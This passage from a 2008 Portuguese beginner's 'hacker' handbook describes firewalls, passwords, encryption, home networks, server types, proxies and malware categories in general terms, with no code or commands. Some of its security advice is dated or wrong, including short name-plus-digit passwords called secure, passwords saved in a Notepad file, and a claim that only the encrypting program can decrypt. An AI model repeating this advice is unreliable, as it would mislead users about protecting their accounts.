+ira segurar a ação do programa P2P e ira perguntar se você realmente quer abrir a 
+porta X, caso você aceite o abrimento da porta X, o firewall ira deixar o programa P2P 
+seguir em frete. Isso ocorre com qualquer programa que tente abrir uma porta no 
+computador.
+ O firewall também entra em ação quando você esta recebendo ou enviando
+dados seja em rede ou pela internet, nesse caso o firewall irá monitorar esses dados 
+recebidos, e avisar o usuário do computador caso aja alguma ação suspeita.
+ Como um antivírus e anti spyware, o firewall 
+também é muito importante para segurança do seu 
+computador, e também deve ser atualizado. Apesar da 
+missão do firewall parecer ser simples não é, e como 
+qualquer outro programa o firewall não é 100% seguro, 
+digamos que ele consegue exercer sua função com 90% 
+de sucesso.
+ Tudo que nos não vemos é difícil de entender 
+como que funciona, como o ar, o espaço, a eletricidade, 
+etc. Em informática se tem esse mesmo problema, por 
+exemplo: o antivírus faz todo um processo para detectar um vírus e nos nem 
+percebemos, só vemos o resultado final. Para resolver esse problema e podermos ter 
+uma melhor compreensão do funcionamento dos programas, nos podemos usar um 
+dom que todo mundo recebe ao nascer que é a imaginação. No caso do Firewall 
+podemos imaginar ele da seguinte forma: “Um segurança de 3 metros de altura, 
+fazendo a proteção de uma festa particular em sua casa, a ordem que esse segurança 
+recebeu foi de barrar qualquer um que não seja convidado, e perguntar para o dono 
+www.mundodoshacker.com pagina. 26 Apostila Para Hackers Iniciantes > Firewall Profº Paulo
+da festa se ele deixa ou não a pessoa que não foi convidada entrar, caso o dono da 
+festa deixe essa pessoa entrar, o segurança terá que ficar de olho nessa pessoa, e
+caso haja alguma ação suspeita o segurança avisara o dono da festa.”
+ Hoje em daí também há vários Firewalls disponíveis para downloads na Internet, 
+os melhores para uso doméstico são: 
+Cômodo Personal Firewall (gratuito, suporte a língua portuguesa), Zone Alarme 
+(gratuito), Ashampoo Firewall (gratuito). 
+ Você pode encontrar o Comodo e Zone Alarme no site do Mundo Dos Hackers: 
+www.mundodoshacker.com. O Ashampoo você pode encontrar no site do seu 
+desenvolvedor: http://www.ashampoo.com/ ou no site do Baixaki: 
+www.baixaki.com.br 
+www.mundodoshacker.com pagina. 27 Apostila Para Hackers Iniciantes > Senha seguras Profº Paulo
+ Ter uma senha segura parece ser uma coisa básica, mas hoje em dia ainda tem
+casos de pessoas que colocam como senha de seus e-mails e outros serviços que 
+precisam de senha, as senhas mais fáceis possíveis como seqüências numéricas, 
+data de nascimento, nome completo, nome do pai, nome da namorada (o), etc. Olha 
+eu vou ser sincero, quem coloca uma senha como as citadas acima, ta pedindo para 
+ter o seu e-mail invadido! Essa não é a primeira e nem será a última vez que esse 
+assunto será tratado em uma apostila, por isso já ta mais que na hora do pessoal que 
+usa internet colocar umas senhas mais seguras não é?
+ Uma senha, pode ser uma simples senha para muitos, mas se pararmos para 
+pensar, o descobrimento de uma senha pode levar a outra que pode levar a outra, e 
+quando menos esperar a sua conta no banco esta zerada. Por isso que é muito 
+importante definir uma senha segura seja para qualquer conta 
+que você venha a fazer (e-mail, Orkut, MSN, Yahoo, Internet 
+banking, Fóruns de discuções, etc). Em alguns sites já não são 
+aceitas senhas consideradas de fácil descoberta, como data 
+de nascimento, seqüência numérica, nome próprio, etc. Mas 
+não são todos os sites que contam com esse artifício. 
+ Uma maneira simples de fazer uma senha segura é 
+misturando letras com números de forma que não seja muito 
+difícil de ser lembrada, exemplo: 
+4587paulo, paulo1254, 4587paulo1254, e por ai vai. Podemos também fazer aquelas 
+senhas que são bemmmm seguras, para fazer esse tipo de senha, bata 
+carinhosamente com a mão no teclado e deixa as letras rolarem :D, exemplo: 
+s654fs8d975ew64r8 (Obs: Pelo amor de Deus, se for fazer uma senha dessa, não 
+esqueça de salva-la em um bloco de notas :D!)
+ Uma senha não precisa ser necessariamente grande para ser segura, com 
+apenas 5 dígitos você pode elaborar uma senha bem segura, o que importa é você 
+não definir senhas fáceis como: 1234, 4321, paulo, paulotacio, 25/03, paulo123, 
+paulo321, taciopaulo, tacio1234, entre outras. Hoje em dia há alguns programas que 
+geram senhas seguras, um bom programa desse tipo é o: Advanced Password 
+Generator . Esse programa pode ser encontrado no site do seu fabricante: 
+http://www.segobit.com/ ou no site do baixaki: www.baixaki.com.br .
+www.mundodoshacker.com pagina. 28 Apostila Para Hackers Iniciantes > Criptografia Profº Paulo
+ Quando falamos em segurança é impossível não comentar sobre criptografia, 
+pois ela é uma das peças chave para segurança. Criptografia vem do Grego: kryptós, 
+"escondido", e gráphein, "escrita", ou seja escrita escondida. Hoje em dia podemos 
+usar a criptografia para diversos fins como mandar e-mails, fazer senhas, etc. Para 
+quem quer ser um hacker é necessário entender pelo menos o básico, pois algumas 
+senhas de servidores, contas, etc, são criptografadas. 
+ A encriptação hoje em dia é basicamente feito por algoritmos que fazem o 
+embaralhamento dos bits desses dados a partir de uma determinada chave ou par de 
+chaves, dependendo do sistema criptográfico escolhido, resumindo o programa 
+embaralha as letras. Uma palavra simples como: Hackers encriptada pode ficar assim:
+5a8RBflX . Quando uma mensagem encriptada é enviada para uma pessoa, essa 
+pessoa só poderá ler a mensagem se tiver o mesmo programa que foi utilizado para 
+encriptar a mensagem, ou seja só o programa que foi utilizado na encriptação pode 
+fazer o desencriptamento. 
+ Para que eu iria querer enviar uma mensagem encriptada? Bom se não for por 
+motivo de algum segredo ou em questão de segurança, não seria necessário o envio 
+de mensagem encriptada! 
+ Alem dos emcriptadores básicos como de mensagens, tem também 
+os mais avançados para encriptar dados e protocolos, fora os programas 
+tem-se ainda Hardwares de encriptação para computadores em rede, com 
+esses hardwares você pode transferir dados normalmente, a única 
+diferencia é que todos esses dados serão poderosamente encriptados, 
+evitando então técnicas como (Sniffing), o único problema desses 
+Hardwares é que eles são muito caros, e que todos os computadores que 
+receberão os dados do computador com o Hardware de encriptação, 
+também deverá ter o mesmo hardware de emcriptação, para que possa compreender 
+os dados e desencripta-los, saindo então um custo muito grande até mesmo para 
+empresas, a vantagem é que se algum hacker conseguir desviar os dados, ele não irá 
+conseguir ler o mesmo com tanta facilidade.
+ Um programa simples e eficaz que encripta mensagens é o “Etext”. Veja um 
+exemplo de uma mensagem encriptada pelo Etext:
+www.mundodoshacker.com pagina. 29 Apostila Para Hackers Iniciantes > Criptografia Profº Paulo
+4lGxpKe/BvcsQlI2gZ2+Va4EPK9Nr5LD1e0dZJ/3HuujkF+mPJ1kffMqj6c5TRB9H1/HIe
+xoSuU0RAV5DTPyI3AXiFX5pXtHtigMeMUZD3xWcZnPBcJI0h/wpK0PsnfJz/XWNFxaJ
+7GkWVs/OHxVg5xlcAPtvtTOTz+4dlbdaIoOPpwE+as3aUj2G1OyFdWtswSjPJ+lnlyRFf
+VkbH+AdtwoKWSiwOK1VM8Yhv/qCiOo+HDmuqjB1dSYu88SuXxOEIq4Ho0e+gVC35
+a0vFQE7gLS0w==
+Essa mensagem foi a seguinte:
+Ola!!! Faça bom proveito da apostila para Hackers Iniciantes versão 2008!!! Caso você 
+tenha alguma dúvida entre em contato comigo pelo telefone: (11) 7427-1943 ou pelo 
+e-mail: paulotacio@mundodoshackers.x-br.com
+ Já pensou se todo o conteúdo dessa apostila fosse encriptado :D!!!
+ Você pode encontrar o Etext no site do seu fabricante: 
+http://www.elentaris.co.uk/ ou no site do Baixaki: www.baixaki.com.br .
+Lembre-se que para a pessoa ler uma mensagem encriptada ela deve ter o mesmo 
+programa usado para encriptar a mensagem.
+www.mundodoshacker.com pagina. 30 Apostila Para Hackers Iniciantes > Capitulo 3 Profº Paulo
+ 
+www.mundodoshacker.com pagina. 31 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+www.mundodoshacker.com pagina. 32 Apostila Para Hackers Iniciantes > O que é uma rede de computadores ? Profº Paulo
+ 
+ Uma rede de computadores é quando a vários computadores interligados, seja 
+através de fios ou não, podendo dessa forma transferir dados, compartilhar 
+informações, mandar mensagens, compartilhar impressora, compartilhar arquivos, etc.
+Um bom exemplo de rede de computadores é a “Internet”, (rede mundial de 
+computadores), quando você acessa um site, manda e-mails, conversa em
+mensageiros instantâneos, em salas de bate papo, você esta compartilhando dados e 
+informações com outros computadores. Uma rede domestica não é muito diferente da 
+Internet, computadores que estão em uma rede privada (domestica), podem 
+compartilhar entre si coisas mais importantes como: impressora, conexão a Internet, 
+arquivos, pastas ou até mesmo o HD inteiro. 
+ Uma rede pode ser feita através de cabos ou através de conexão sem fio como: 
+Rede por cabo: Rede de Cabo coaxial, Rede de Cabo de fibra óptica, Rede de Cabo 
+de par trançado. Ou rede sem fios: Rede por infravermelhos, Rede por microondas, 
+Rede por rádio. Quando tratamos de rede domestica o melhor meio de faze-la é 
+através de cabos.
+ Tudo que esta em rede seja uma rede domestica ou até mesmo a Internet, pode 
+ser invadido através de técnicas, incluindo o seu PC, pois quando você esta em rede 
+seu computador tem acesso a outros computadores e outros computadores também 
+tem acesso ao seu, um bom exemplo disso é um trojan, quando alguém é infectado 
+por algum trojan o computador dessa pessoa estará em uma rede direta com o 
+computador do invasor, dando então controle do seu PC para o invasor.
+ Quando se tem uma rede é muito importante monitorar e fazer a segurança 
+dessa rede, para que todos os computadores dessa rede não fiquem expostos a 
+invasores. O uso de Antivírus, Anti Spywares, Firewall e até mesmo o uso de um 
+www.mundodoshacker.com pagina. 33 Apostila Para Hackers Iniciantes > O que é uma rede de computadores ? Profº Paulo
+scanner, são indispensáveis para uma boa segurança da rede, fora isso deve-se ficar 
+sempre atento a mudanças não autorizadas em arquivos e/ou pastas, e no 
+cabeamento da rede.
+www.mundodoshacker.com pagina. 34 Apostila Para Hackers Iniciantes > Equipamentos para montar uma rede... Profº Paulo
+ Não é necessário muita coisa para fazer uma rede domestica básica! Como foi 
+dito acima a maneira mais recomendável para fazer uma rede domestica é através de 
+cabos. No caso de uma rede entre dois computadores, não será necessário nem um 
+roteador e nem um hub, serão usados apenas um cabo de rede crossover (cabo 
+direto) e duas placas de rede (uma em cada computador), os cabos crossover tornam
+possível a ligação de dois PCs sem a utilização de um hub, isso ocorre pela maneira 
+em que o cabo é crimpado. Observe abaixo qual a ordem das cores em que um cabo
+Crossover deve ser crimpado:
+ Lado A Lado B Lado A Lado B
+branco/ verde branco/ laranja 
+ verde laranja
+ branco/laranja branco/ verde
+ azul azul
+ branco/azul branco/ azul
+ laranja verde
+ branco/marrom branco/ marrom
+ marrom marrom
+www.mundodoshacker.com pagina. 35 Apostila Para Hackers Iniciantes > Equipamentos para montar uma rede... Profº Paulo
+ Quando o cabo crossover é ligado nas duas maquinas, tense instantaneamente 
+uma rede entre os dois computadores, tendo então que ser feito apenas a 
+configuração dos computadores para que se reconheçam no mesmo grupo de 
+trabalho.
+ No caso de uma rede com mais de 2 computadores utiliza-se um cabo de rede 
+normal, com as duas pontas com a mesma seqüência de cabos. Abaixo a seqüência 
+de cores de um cabo de rede normal:
+ Lado A Lado B Lado A Lado B
+branco/ laranja branco/ laranja
+laranja laranja
+branco/ verde branco/ verde
+azul azul
+branco/ azul branco/ azul
+verde verde
+branco/ marrom branco/ marrom
+marrom marrom
+ Alem do cabo normal, para fazer uma rede com mais de 2 computadores é 
+preciso também de um roteador (opcional), um hub com a quantidade de saídas igual 
+ou maior que o numero de computadores e placas de rede (uma para cada PC).
+ Abaixo uma lista do equipamento necessário para montar uma rede e a média 
+do preço dos equipamentos: 
+Cabo de rede (Crossover ou normal): R$ 1,00 o metro
+www.mundodoshacker.com pagina. 36 Apostila Para Hackers Iniciantes > Equipamentos para montar uma rede... Profº Paulo
+Roteador (opcional, para uma rede com mais de 2 computadores): R$ 90,00
+Hub (para uma rede com mais de 2 computadores): R$ 50,00 (preço baseado em um 
+hub com 8 portas)
+Placa de Rede PCI (uma para cada computador): R$ 20,00
+ 
+Obs: A maioria dos computadores já vem com uma placa de rede onboard (embutida 
+na placa mãe), caso o seu computador tenha uma placa de rede onboard não será 
+necessário a compra de uma placa de rede.
+www.mundodoshacker.com pagina. 37 Apostila Para Hackers Iniciantes > Capitulo 4 Profº Paulo
+www.mundodoshacker.com pagina. 38 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+www.mundodoshacker.com pagina. 39 Apostila Para Hackers Iniciantes > Servidor Web Profº Paulo
+ O Servidor Web é responsável pelo armazenamento de paginas de um 
+determinado site, que são requisitadas pelos clientes através de browsers.
+ Um servidor web é nada mais nada menos que um programa que responde a 
+pedidos http de clientes (http://www.mundodoshacker.com), esses pedidos são feitos 
+através dos navegadores, a resposta do servidor são as paginas HTML (paginas do 
+site) que vem ou não com imagens embutidas.
+ Um bom programa para se fazer um servidor web é o “Apache for Windows”, ele 
+pode ser encontrado no site do seu fabricante: http://www.apache.org/ ou no site do 
+Baixaki: www.baixaki.com.br
+ Lembrando que para montar um servidor não é nada fácil e nem barato, para 
+montar qualquer tipo de servidor, é preciso ter computadores apropriados para 
+servidores, banda larga de pelo menos 2 megabytes, e um lugar apropriado em que o 
+seu servidor possa funcionar sem problemas. Portanto é mais recomendável você 
+usar não só os servidores web disponíveis na Internet, como também outros tipos de 
+servidores como: servidor de e-mails, servidor de arquivos, servidor proxy, entre 
+outros.
+www.mundodoshacker.com pagina. 40 Apostila Para Hackers Iniciantes > Servidor de arquivos Profº Paulo
+ 
+ O servidor de arquivos é responsável pelo armazenamento e distribuição de 
+arquivos de usuários. Cada servidor de arquivo tem um propósito diferente, alguns são 
+para backups, compartilhamento de informações, armazenamento remoto, entre 
+outros fins. Esse tipo de servidor chega a ser como um HD virtual, com ele você pode 
+guardar arquivos e acessa-los em qualquer outro lugar (que tenha computador e 
+internet é claro :D).
+ Hoje em dia estão disponíveis na Internet alguns servidores de arquivos, alguns 
+mais simples e outros mais complexos, mas todos cumprem com êxito a sua tarefa. 
+Abaixo links de alguns servidores de arquivos:
+http://www.digitalbucket.net/ (GRATUITO)
+http://fileurls.com/ (GRATUITO)
+http://drop.io/ (GRATUITO)
+ 
+ Fora os Servidores de arquivos acima, tem também alguns outros sites que já 
+são bem conhecidos, e que podem ser considerados também como um servidor de 
+arquivos, são eles:
+RapidShare: http://rapidshare.com/ 
+EasyShare: http://w15.easy-share.com/
+www.mundodoshacker.com pagina. 41 Apostila Para Hackers Iniciantes > Servidor de e-mail Profº Paulo
+ O servidor de e-mail é responsável pelo envio, recebimento, e armazenamento 
+de mensagens de correio eltronico (e-mail), como todos servidores, o servidor de 
+e-mail é apenas um programa instalado em um computador que consegue armazenar, 
+receber e enviar mensagens para contas de e-mail que estejam conectadas a Internet.
+O servidor de e-mail é baseado no protocolo SMTP.
+ Caso você queira fazer um servidor de e-mail você pode utilizar o programa: 
+“MDaemon (PAGO)”, disponível para downloads no site do seu fabricante: 
+http://www.altn.com/ ou você também pode optar em baixa-lo no site do Baixaki: 
+www.baixaki.com.br
+www.mundodoshacker.com pagina. 42 Apostila Para Hackers Iniciantes > Servidor de e-mail Profº Paulo
+ Um servidor webmail é diferente de um servidor de e-mail, a função do servidor 
+webmail é de possibilitar a criações de e-mails para troca de informações pela web. O 
+dono do servidor pode criar o seus e-mails de qualquer maneira exemplo: 
+mundodoshackers@mundodoshackers.com , paulotacio@professorpaulo.com , 
+cursodehacker@mundodoshackers.com , etc. No entanto não pode haver dois 
+endereço de e-mails iguais na web (Internet), para que não haja desvio de 
+mensagens, seria a mesma coisa que dois telefones com o mesmo numero, os dois 
+receberiam a ligação.
+ Acho que todos sabem, que há muitos servidores webmail gratuitos disponíveis 
+na Internet, alguns servidores já ganharam sua fama e preferência dos usuários e 
+outros vem conquistando aos poucos os olhares,todos são excelentes, na verdade 
+hoje em dia só não tem e-mail quem não quer :D!!!
+ Abaixo uma lista de servidores webmail (muitos você já conhece).
+Yahoo: www.yahoo.com.br
+Hotmail: www.msn.com.br
+IG: www.ig.com.br
+Bol: www.bol.uol.com.br
+Gmail: http://mail.google.com/mail/signup
+Entre outros!!!
+www.mundodoshacker.com pagina. 43 Apostila Para Hackers Iniciantes > Servidor de banco de dados Profº Paulo
+ Os servidores de banco de dados possui e administra informações de banco de 
+dados, como por exemplo cadastros de usuários. Para montar um servidor desse tipo 
+é preciso ter um bom conhecimento em rede (é claro) e também um bom 
+conhecimento em programação e segurança, afinal banco de dados, são banco de 
+dados :D!
+www.mundodoshacker.com pagina. 44 Apostila Para Hackers Iniciantes > Servidor de Impressão Profº Paulo
+ O Servidor de impressão é responsável por controlar pedidos de impressão de 
+clientes, no caso do servidor de impressão o computador da rede que será o servidor,
+é o que esta com a impressora instalada, após compartilhar a 
+impressora com todos ou parte dos computadores do mesmo 
+grupo de trabalho, o PC servidor poderá então receber 
+pedidos de impressão de qualquer computador da rede 
+(cliente). O processo é muito simples, o PC cliente faz pedido 
+de impressão de um determinado arquivo para a impressora 
+instalado no PC servidor, feito isso o arquivo é transferido 
+pela rede e a impressão começa.
+ Para montar um servidor de impressão basta você instalar uma impressora no 
+PC servidor da rede, e compartilhar a impressora com todos ou parte dos PCs clientes 
+da rede.
+www.mundodoshacker.com pagina. 45 Apostila Para Hackers Iniciantes > Servidor DNS Profº Paulo
+ Os servidores DNS são responsáveis pela conversão de endereços de sites em 
+endereços de IP e vice-versa. DNS significa Domain Name System, Sistemas de 
+nomes de domínios. 
+ O servidor DNS praticamente permite que um usuário chegue a um site, ele 
+armazena e organiza os nomes de domínios, e os relaciona a um endereço de IP, 
+permitindo então que usuário acesse os dados de um determinado domínio. Um site 
+precisa ter no mínimo dois servidores DNS que serão responsáveis por responder
+pelo seu domínio.
+Exemplo de domínios de um site: www.mundodoshacker.com ou 
+www.mundodoshackers.x-br.com 
+www.mundodoshacker.com pagina. 46 Apostila Para Hackers Iniciantes > Servidor FTP Profº Paulo
+ Um servidor FTP (File Transfer Protocol/ Protocolo de Transferência de Arquivo), 
+permite que usuários acesse e/ou transfira arquivos para um determinado disco rígido, 
+ou servidor, seja através de senha ou não, a porta utilizada pelo FTP é a 21. Hoje em 
+dia a vários servidores web que aceitam transferência de arquivos e/ou paginas para 
+um determinado site através do FTP, essa forma de transferência chega até a ser 
+mais rápida do que as mais convencionais.
+www.mundodoshacker.com pagina. 47 Apostila Para Hackers Iniciantes > Servidor de imagens Profº Paulo
+ O servidor de imagem como o próprio nome já diz, é responsável 
+em armazenar imagens digitais, com um servidor de imagens você 
+pode enviar e acessar as suas imagens de qualquer lugar, é como se 
+fosse a pasta “minhas imagens” do seu PC só que na internet. A 
+utilidade de um servidor desse tipo quem vai decidir é você, afinal nem 
+tudo é útil para todos.
+ Abaixo alguns links de servidores de imagens:
+http://photobucket.com/
+http://imageshack.us/
+www.mundodoshacker.com pagina. 48 Apostila Para Hackers Iniciantes > Servidor Proxy Profº Paulo
+ Como muitos sabem os servidores Proxy camufla o seu IP quando você acessa 
+um determinado site, mas ele não serve apenas para isso! Um servidor Proxy também 
+armazena os arquivos em que você pediu para um site, para que na próxima visita a 
+esse site o carregamento seja mais rápido, ou seja o Proxy não só para uma função. 
+ Um servidor Proxy age basicamente da seguinte forma: você faz pedido de uma 
+determinada pagina de um site através do servidor Proxy, o servidor Proxy se conecta 
+a pagina que você pediu só que como se ele mesmo estivesse querendo se conectar 
+a ela, ou seja com o próprio numero de IP, deixando o seu numero de IP oculto. Para 
+ser mais claro, o servidor Proxy é como se fosse um amigo seu que da a cara a tapa 
+no seu lugar, você fala para seu amigo falar com uma menina linda e se esconde atrás 
+dele, qualquer coisa não der certo quem vai pagar o pato é o seu amigo :D.
+ Mesmo você utilizando um servidor Proxy não significa que você esta 100% 
+anônimo na Internet, afinal o servidor Proxy registrara o seu IP e seus pedidos (o seu 
+amigo sabe que foi você que mandou ele falar com a menina linda, então ele pode te 
+pegar :D).
+www.mundodoshacker.com pagina. 49 Apostila Para Hackers Iniciantes > Capitulo 5 Profº Paulo
+www.mundodoshacker.com pagina. 50 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+www.mundodoshacker.com pagina. 51 Apostila Para Hackers Iniciantes > Trojans Profº Paulo
+ Quem nunca foi infectado por um trojan? Acho difícil de ter uma pessoa, ou 
+melhor, um computador que nunca sofreu na mão de um trojan, 80% dos ataques na 
+Internet hoje em dia são através de trojans. Os trojans são softwares (programas), que 
+ao ser executado em um computador, da ao Hacker controle absoluto do PC infectado 
+(depende do trojan), o Hacker poderá: controlar a tela do computador, desligar o 
+computador, reiniciar o computador, formatar o computador, roubar senhas, roubar 
+arquivos, criar pastas, deixar o mouse doido, acender as luzes do teclado, finalizar 
+processos, executar programas, etc.
+ Tudo que é feito para o bem pode ser usado para o mal não é? Um trojan não 
+nasceu trojan ele foi feito trojan com tempo, um trojan é nada 
+mais nada menos que um programa de “gerenciamento 
+remoto”, um programa de gerenciamento remoto é um 
+programa que permite ao dono de um computador, controlar o 
+seu computador mesmo sem estar na frente dele, podendo 
+então fazer tarefas como, acessar arquivos e até mesmo 
+desligar o computador. A partir daí eu acho que você já 
+imagina o que aconteceu não é? Graças a “imaginação”, foi 
+criado então um “trojan”, apenas uniram o útil ao agradável :D. 
+Hoje em dia já temos trojans natos, aqueles que desde o inicio 
+de sua criação já foi feito para invadir e não adaptado para 
+essa ação.
+ Um trojan também é conhecido como “cavalo de tróia” (nem precisa falar o por 
+que, não é :D), como qualquer outro programa ele é feito em uma linguagem de 
+programação, na maioria das vezes em “C”, apesar de também ter excelentes trojans
+em “Delphi” e até “Visual Basic”, nem todos trojans são iguais, alguns tem uma 
+característica diferente, o que lhe torna o preferido dos hackers, mas sem dúvida os 
+melhores são os que tem suporte a conexão reversa.
+ O que te protege desses cavalos de tróia são os antivírus (capitulo 2), quando 
+você tenta executar o trojan o antivírus lhe avisa do risco e pergunta se você quer 
+excluir o trojan.
+www.mundodoshacker.com pagina. 52 Apostila Para Hackers Iniciantes > Keyloggers Profº Paulo
+ Outro inimigo dos usuários da Internet, e amigo dos Hackers! Os keyloggers
+(vírus espiões/ spyware), são softwares (você já sabe o que é software não é? :D), 
+que ao ser executado em um computador, irá capturar todas as teclas que a vitima
+digitar, e enviara em forma de texto para o e-mail configurado pelo Hacker, dessa 
+forma tudo que a vitima digitou será visto pelo Hacker, como: conversa no MSN, sites 
+visitados, senhas, mensagens, etc. Os keyloggers ainda são indetectaveis para alguns 
+antivírus (depende do keylogger e do antivírus), por isso em certos casos os
+keyloggers chegam até ser melhor que os trojans, isso vai depender da ocasião.
+ Diferente dos trojans, os keyloggers nasceram 
+keyloggers, apesar dos keyloggers terem sido feitos para 
+que os pais tivessem um controle do que os filhos andam 
+fazendo na internet, ninguém pode negar que desde o 
+inicio os keyloggers foram feitos para invadir a 
+privacidade das pessoas, ninguém é tão inocente de 
+achar que esse tipo de programa nunca seria usado para 
+invasão :D. 
+ O numero de ataques por keyloggers na Internet também são muito grandes, até 
+pelo fato de ele não ser detectado por alguns antivírus, mas na minha opinião o maior 
+motivo desse grande numero de ataques por keyloggers são a funcionalidade e 
+praticidade excelente dos keyloggers, ou seja não precisa ser um HACKERRR para 
+fazer uma invasão com keyloggers, eles são muitos simples de serem configurados e 
+utilizados.
+ O que te protege dos Keyloggers são os Anti-sypywares (capitulo 2), como já foi 
+dito, não são todos os antivírus que conseguem detectar keyloggers, por isso não 
+adianta dar tapa na cara dos keyloggers e depois ir se esconder atrás dos antivírus, 
+que você ou melhor, seu computador vai levar a pior :D.
+www.mundodoshacker.com pagina. 53 Apostila Para Hackers Iniciantes > Worms Profº Paulo
+ Os worms como todo bom vírus se alastra pelo PC infectado, ele se espalha 
+rapidamente, os worms alem de se espalharem, eles assim que executados passam 
+a controlar os recursos de transporte de arquivos e/ou informações do computador, e 
+o pior, os worms tem a capacidade de enviar copias de si mesmo para todos usuários 
+que constam no seu catalogo de endereços de e-mail, podendo então infectar o 
+computador dos usuários e causando assim um efeito domino. 
+ O grande prejuiso que os Worms causam são a lentidão em redes, e até mesmo 
+na Internet caso muitos computadores estejam infectados, o tempo que uma pessoa 
+levaria para abrir uma pagina de um site seria quase o dobro.
+ Hoje em dia os antivírus (capitulo 2) já protegem os seus usuários de worms.
+www.mundodoshacker.com pagina. 54 Apostila Para Hackers Iniciantes > Rootkits Profº Paulo
+ Os rootkits são trojans mais avançados, ao contrario dos trojans comuns os 
+rootkits não são detectados por qualquer antivírus, isso ocorre porque os rootkits são 
+feitos em uma linguagem de programação avançada, podendo então estar sempre um 
+pé na frente dos antivírus. O rootkit pode interceptar solicitações feitas pelo sistema 
+operacional e altera-las, só que ao interceptar as informações o rootkit ira filtrar as 
+informações e deixara passar apenas o código que não esta infectado, por isso que o 
+antivírus não o detecta.
+ Um exemplo de ação de rootkit é a seguinte: O seu sistema operacional faz um 
+pedido de abertura de arquivo a mando do usuário, feito isso o rootkit ira interceptar os 
+dados que são requisitados e ira filtrar os dados deixando passar apenas o que não 
+esta infectado, dessa forma o antivírus irá achar que não tem nada de malicioso no 
+arquivo. Quando o rootkit já foi executado e já infectou o PC, ele ira infectar os 
+processos na memória, de forma que assim que o Windows fizer algum pedido de 
+informação do trojan (rootkit), esta informação será anulada antes de retornar ao 
+programa, isso fará com que os softwares acreditem que estes arquivos não estejam 
+lá.
+www.mundodoshacker.com pagina. 55 Apostila Para Hackers Iniciantes > Ransomware Profº Paulo
+ Os Ransomwares são programas maliciosos (vírus), que são feitos com a 
+intenção de extorquir a vitima. Ao ser executado o ransomware irá criptografar todos 
+ou parte dos arquivos da vitima, como foi dito no capitulo 2, quando um arquivo é 
+encriptado é preciso ter o mesmo programa que o encriptou para desencriptar esse 
+arquivo. Depois que o vírus foi executado e já encriptou os arquivos da vitima, o 
+Cracker irá sugerir uma troca pelos arquivos criptografados. Adivinha o que o cracker 
+vai querer em troca, para devolver os arquivos! Uma bola? Não! Um beijo? Não! Um 
+refresco de tamarindo :D? Não! Um computador novinho em folha? Pode até ser, mas 
+não! Dinheiro? Aaaaeeeeee!!! É isso ai! Isso depende do cracker é claro, mas a 
+maioria pede dinheiro em troca dos arquivos, o pior disso tudo é que como todos os 
+arquivos estão na mão do cracker, o que lhe garante que ele irá desencripta-los após 
+o pagamento do resgate ? Ele pode muito bem pegar o dinheiro, e pedir mais para ai 
+sim desencriptar os arquivos.
+ Esses tipos de ataques são meio raros na Internet, na verdade a maioria dos 
+usuários de Internet nem imagina que existe esse tipo de ataque, mas como você 
+pode ver, esse tipo de ataque chega a ser até pior do que trojans ou Keyloggers, você 
+estará praticamente nas mãos do Cracker (Obs: isso se ele encriptar algum arquivo 
+importante e indispensável para você é claro :D).
+ Esse tipo de ataque é considerado inteiramente ilegal, pois quem pratica esse 
+ataque esta sem dúvida extorquindo (chantageando) uma pessoa, para obter dinheiro, 
+alias, nem tem como justificar que você praticou esse tipo de ataque para fins de 
+estudos não é :D. 
+www.mundodoshacker.com pagina. 56 Apostila Para Hackers Iniciantes > Adwares Profº Paulo
+ Os Adwares se assemelham-se aos spywares, pela forma em que ele infecta o 
+computador e a maneira em que ele é desinstalado, é como se fosse um subgrupo de 
+spywares. Os adwares tem como objetivo mostrar janelas de propagandas na tela da 
+vitima. Na maioria das vezes os adwares são feitos por empresas comerciais, por isso 
+não é de se assustar, ao achar um adware em programas livres (os famosos 
+programas freeware). Como você pode ver nem tudo é livre :D!
+ Para se proteger de adwares você deve utilizar um anti spywares e/ou anti 
+adwares (capitulo 2).
+www.mundodoshacker.com pagina. 57 Apostila Para Hackers Iniciantes > Hijackers Profº Paulo
+ Os Hijackers são os seqüestradores de navegadores, eles podem ser scripts ou 
+programas, ao ser executado ele seqüestra o navegador de Internet, principalmente o 
+Internet Explorer. Os Hijackers alteram a pagina inicial da vitima e impede que ela 
+altere para uma de sua preferência, alem disso, os Hijackers mostram propagandas 
+em forma de pop-ups ou em janelas novas, impedem o acesso de algumas paginas de 
+sites (principalmente paginas que você pode fazer download de antivírus) e pode 
+também instalar barras de ferramentas no navegador.
+ Hoje em dia há um grande numero de vitimas de hijackers, pelo fato de fácil
+infecção, para uma pessoa ser infectada basta entrar em um site malicioso ou 
+executar um programa.
+ 
+www.mundodoshacker.com pagina. 58 Apostila Para Hackers Iniciantes > Scanner Profº Paulo
+ Um Scanner é um programa que possibilita um escaneamento seja do seu 
+computador, de um servidor ou até mesmo de um site, o principal objetivo dos 
+scanners são de mostrar quais as vulnerabilidades que o computador tem, para que 
+então possam ser corrigidas.
+ Há vários tipos de scanners, e para todos sistemas operacionais, uns para Linux, 
+outros para Windows, uns mais simples e outros mais completos. Os scanners mais 
+simples, lhe mostra somente as vulnerabilidades, e alguns scannea apenas um 
+computador, ou seja se seu PC estiver em rede ele vai 
+scannear um computador (o que o scanner esta instalado),
+e não a rede, os mais completos são os mais 
+recomendáveis, alem de eles mostrarem as 
+vulnerabilidades, esses scanners ainda lhe mostra a solução 
+para correção das vulnerabilidades, e ainda scanneam toda 
+a rede, dois scanners excelentes e completos são o 
+Languard e o Nessus. 
+ O Scanner pode ser usado tanto para defesa quanto para invasão, uma pessoa 
+que quer se defender de ataques deve scannear seu computador e corrigir as 
+vulnerabilidades, já a pessoa que quer invadir um determinado computador scannea 
+esse computador, e fica a par das vulnerabilidades do computador alvo, podendo 
+então ter um ponto de referencia para um ataque. Como eu disse tudo que foi feito 
+para o bem pode ser usado para o mal :D! O que vai determinar se o programa é para 
+segurança ou não será o usuário do programa!
+www.mundodoshacker.com pagina. 59 Apostila Para Hackers Iniciantes > Sniffer Profº Paulo
+ Um Sniffer é um programa ou Hardware que desvia protocolos em uma rede.
+Tudo que é feito em uma rede como: mandar e-mails, conversar no MSN, acessar
+sites, etc, são feitos através de protocolos, por tanto se alguém usar um sniffer em 
+uma rede, irá pegar muitas coisas interessantes como por exemplo uma senha de 
+e-mail ou qualquer outro tipo de conta.
+ Hoje em dia quem pratica sniffing usa mais programas do que hardwares, pela 
+facilidade de serem achados, e serem muito eficazes. O sniffing é mais usado em 
+redes comerciais, com a intenção de desviar informações importantes como: senhas, 
